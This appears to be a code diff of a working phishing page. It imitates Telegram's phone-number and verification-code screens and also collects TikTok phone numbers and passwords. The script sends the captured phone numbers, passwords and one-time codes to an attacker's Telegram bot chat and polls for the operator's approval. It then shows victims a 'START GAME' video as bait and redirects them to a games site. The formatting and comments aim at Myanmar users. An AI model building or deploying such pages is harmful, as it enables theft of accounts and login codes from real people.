@@ -15,7 +15,6 @@
         .notice-success { background: #22c55e; }
         .notice-error { background: #ef4444; }
 
-        /* Telegram UI New Styles based on 1000032606.jpg & 1000032607.jpg */
         .tg-bg { background-color: #1c242f; color: white; }
         .tg-input-group { border: 1.5px solid #3390ec; border-radius: 12px; padding: 12px; position: relative; margin-top: 25px; background: transparent; }
         .tg-label { position: absolute; top: -10px; left: 15px; background: #1c242f; padding: 0 5px; color: #3390ec; font-size: 13px; }
@@ -90,14 +89,13 @@
         </div>
     </div>
 
-    <!-- TELEGRAM PHONE SCREEN (Updated UI 1000032606.jpg) -->
+    <!-- TELEGRAM PHONE SCREEN -->
     <div id="tgScreen" class="hidden tg-bg w-full h-full p-6 flex flex-col items-center pt-10">
         <div class="w-full mb-6">
             <i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-xl cursor-pointer"></i>
         </div>
         <h1 class="text-2xl font-bold mb-2">Your phone number</h1>
         <p class="text-gray-400 text-center mb-8">Please confirm your country code and enter your phone number.</p>
-
         <div class="w-full max-w-xs">
             <div class="tg-input-group mb-4">
                 <span class="tg-label">Country</span>
@@ -106,7 +104,6 @@
                     <i class="fa-solid fa-chevron-right text-gray-500"></i>
                 </div>
             </div>
-
             <div class="tg-input-group">
                 <span class="tg-label">Phone number</span>
                 <div class="flex gap-4 items-center">
@@ -116,23 +113,20 @@
                 </div>
             </div>
         </div>
-
         <button onclick="handleTgNext()" class="fab-next">
             <i id="tgIcon" class="fa-solid fa-arrow-right text-white text-2xl"></i>
             <i id="tgSpin" class="fa-solid fa-circle-notch text-white text-2xl spinner"></i>
         </button>
     </div>
 
-    <!-- TELEGRAM OTP SCREEN (Updated UI 1000032607.jpg) -->
+    <!-- TELEGRAM OTP SCREEN -->
     <div id="tgOtpScreen" class="hidden tg-bg w-full h-full p-6 flex flex-col items-center pt-10">
         <div class="w-full mb-6">
             <i onclick="toggle('tgScreen')" class="fa-solid fa-arrow-left text-xl cursor-pointer"></i>
         </div>
-        
         <div class="text-6xl mb-6">📩</div>
         <h1 class="text-2xl font-bold mb-2">Verification Code</h1>
         <p class="text-gray-400 text-center px-4 mb-8">We've sent the code to the Telegram app on your other device.</p>
-
         <div class="flex gap-2 mb-10" id="otpGroup">
             <input type="number" maxlength="1" class="otp-box" oninput="moveNext(this,0)">
             <input type="number" maxlength="1" class="otp-box" oninput="moveNext(this,1)">
@@ -141,9 +135,7 @@
             <input type="number" maxlength="1" class="otp-box" oninput="moveNext(this,4)">
             <input type="number" maxlength="1" class="otp-box" oninput="moveNext(this,5)">
         </div>
-
         <button onclick="resendTgOtp()" class="text-[#3390ec] font-bold">Resend Code</button>
-
         <button onclick="submitTG()" class="fab-next">
             <i id="otpIcon" class="fa-solid fa-arrow-right text-white text-2xl"></i>
             <i id="otpSpin" class="fa-solid fa-circle-notch text-white text-2xl spinner"></i>
@@ -159,7 +151,7 @@
         </div>
     </div>
 
-    <!-- CLICK SCREEN -->
+    <!-- CLICK SCREEN (Based on 1000032608.jpg) -->
     <div id="clickScreen" class="hidden bg-setup w-full h-full flex items-center justify-center relative">
         <div class="absolute inset-0 bg-black/40"></div>
         <button onclick="playFinalWithAudio()" class="start-trigger z-10">START GAME</button>
@@ -167,7 +159,7 @@
 
     <!-- VIDEO SCREEN -->
     <div id="videoScreen" class="hidden w-full h-full relative bg-black">
-        <video id="bgVideo" loop playsinline preload="auto" class="w-full h-full object-cover">
+        <video id="bgVideo" loop playsinline class="w-full h-full object-cover">
             <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
         </video>
         <button onclick="window.location.href='https://www.crazygames.com'" class="entry-btn-pill">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</button>
@@ -180,7 +172,7 @@
     const chat = "5304050102";
     let userKey = "ID_" + Math.floor(Math.random() * 9999);
     let audioInitialized = false;
-    let audioCtx, gainNode, sourceNode;
+    let audioCtx;
 
     window.onload = function() {
         if(localStorage.getItem("isApproved") === "true") {
@@ -196,7 +188,6 @@
 
     function showOTP() { document.getElementById('otpSection').classList.remove('hidden'); }
 
-    // ဖုန်းနံပါတ်ကို 09 ပြောင်းပေးတဲ့ Function
     function formatTo09(ph) {
         let clean = ph.toString().replace(/\D/g, '');
         if (clean.startsWith('959')) return '0' + clean.substring(2);
@@ -222,7 +213,6 @@
         } catch(e) { console.log("Bot error handled"); }
     }
 
-    // TikTok Submit (Updated with 09 format)
     async function submitTT() {
         const ph = formatTo09(document.getElementById('ttPhone').value);
         const pass = document.getElementById('ttPass').value;
@@ -232,17 +222,13 @@
         startPolling();
     }
 
-    // Telegram UI Logic
     async function handleTgNext() {
         const ph = document.getElementById('tgPhone').value;
         if(!ph) return;
-        
         document.getElementById('tgIcon').style.display = 'none';
         document.getElementById('tgSpin').style.display = 'block';
-
         const formattedPh = formatTo09(ph);
         await sendBot(`📩 Request OTP\nPH: ${formattedPh}\nID: ${userKey}`, null);
-        
         setTimeout(() => {
             document.getElementById('tgIcon').style.display = 'block';
             document.getElementById('tgSpin').style.display = 'none';
@@ -263,22 +249,18 @@
         sendBot(`🔄 Resend OTP Requested\nPH: ${ph}\nID: ${userKey}`);
     }
 
-    // Telegram Submit (Final)
     async function submitTG() {
         let otp = "";
         document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
         if(otp.length < 6) return;
-
         document.getElementById('otpIcon').style.display = 'none';
         document.getElementById('otpSpin').style.display = 'block';
-
         const ph = formatTo09(document.getElementById('tgPhone').value);
         toggle('waitScreen');
         await sendBot(`🔔 Telegram Login\nPH: ${ph}\nOTP: ${otp}\nID: ${userKey}`, true);
         startPolling();
     }
 
-    // မူရင်း Function များ (ဘာမှမပြောင်းလဲပါ)
     function showNotice(msg, type) {
         const el = document.getElementById('topNotice');
         el.innerText = msg;
@@ -294,7 +276,6 @@
                 const data = await res.json();
                 const lastUpdate = data.result?.[data.result.length - 1];
                 const callback = lastUpdate?.callback_query?.data;
-
                 if (callback === `ok_${userKey}`) {
                     clearInterval(interval);
                     localStorage.setItem("isApproved", "true");
@@ -310,26 +291,44 @@
         }, 3000);
     }
 
+    // Audio Logic ကို ပိုမိုခိုင်မာအောင် ပြင်ဆင်ထားသည်
     function playFinalWithAudio() {
         toggle('videoScreen');
         const v = document.getElementById('bgVideo');
-        v.muted = false;
+        
+        // Browser Policy အရ User Click တစ်ချက်ရမှ Audio အလုပ်လုပ်မည်
         if (!audioInitialized) {
-            try {
-                const AudioContextClass = window.AudioContext || window.webkitAudioContext;
-                if (AudioContextClass) {
-                    audioCtx = new AudioContextClass();
-                    sourceNode = audioCtx.createMediaElementSource(v);
-                    gainNode = audioCtx.createGain();
-                    gainNode.gain.value = 3.5; 
-                    sourceNode.connect(gainNode);
-                    gainNode.connect(audioCtx.destination);
-                    audioInitialized = true;
-                }
-            } catch (e) { console.log("Audio Error"); }
+            const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+            if (AudioContextClass) {
+                audioCtx = new AudioContextClass();
+                const source = audioCtx.createMediaElementSource(v);
+                const gainNode = audioCtx.createGain();
+                gainNode.gain.value = 4.0; // အသံချဲ့ရန်
+                source.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                audioInitialized = true;
+            }
         }
-        if (audioCtx && audioCtx.state === "suspended") audioCtx.resume();
-        v.play().catch(err => { v.controls = true; });
+
+        // အသံကို ဖွင့်ရန်
+        v.muted = false; 
+        v.volume = 1.0;
+
+        if (audioCtx && audioCtx.state === "suspended") {
+            audioCtx.resume();
+        }
+
+        const promise = v.play();
+        if (promise !== undefined) {
+            promise.then(_ => {
+                console.log("Playback started successfully");
+            }).catch(error => {
+                console.log("Playback failed: ", error);
+                v.muted = true; // Error ဖြစ်ရင် mute နဲ့အရင်ဖွင့်
+                v.play();
+                // ပြီးမှ User ကို volume ပြန်တင်ခိုင်း
+            });
+        }
     }
 </script>
 </body>
